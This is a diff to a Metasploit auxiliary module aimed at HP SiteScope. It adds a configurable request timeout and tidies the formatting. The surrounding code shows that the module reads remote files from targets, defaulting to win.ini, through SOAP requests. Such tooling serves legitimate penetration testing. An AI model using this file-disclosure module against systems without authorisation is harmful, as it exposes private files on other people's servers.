@@ -38,12 +38,17 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
     [
       Opt::RPORT(8080),
-      OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini']),
-      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
+      OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini' ]),
+      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/' ]),
+      OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 60 ])
     ], self.class)
 
     register_autofilter_ports([ 8080 ])
     deregister_options('RHOST')
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 60
   end
 
   def run_host(ip)
@@ -54,7 +59,8 @@ class Metasploit4 < Msf::Auxiliary
 
     res = send_request_cgi({
       'uri'     => "#{@uri}services/APISiteScopeImpl",
-      'method'  => 'GET'})
+      'method'  => 'GET'
+    }, timeout)
 
     if not res
       print_error("#{peer} - Unable to connect")
@@ -98,9 +104,11 @@ class Metasploit4 < Msf::Auxiliary
       'method'   => 'POST',
       'ctype'    => 'text/xml; charset=UTF-8',
       'data'     => data,
-      'headers'  => {
-        'SOAPAction'    => '""',
-    }}, 60)
+      'headers'  => 
+        {
+          'SOAPAction'    => '""'
+        }
+    }, timeout)
 
     if res and res.code == 500 and res.body =~ /<ns3:hostname xmlns:ns3="http:\/\/xml.apache.org\/axis\/">(.*)<\/ns3:hostname>/m
       host_name = $1
@@ -142,9 +150,11 @@ class Metasploit4 < Msf::Auxiliary
       'method'   => 'POST',
       'ctype'    => 'text/xml; charset=UTF-8',
       'data'     => data,
-      'headers'  => {
-        'SOAPAction'    => '""',
-    }})
+      'headers'  =>
+        {
+          'SOAPAction'    => '""'
+        }
+     }, timeout)
 
     if res and res.code == 200
 
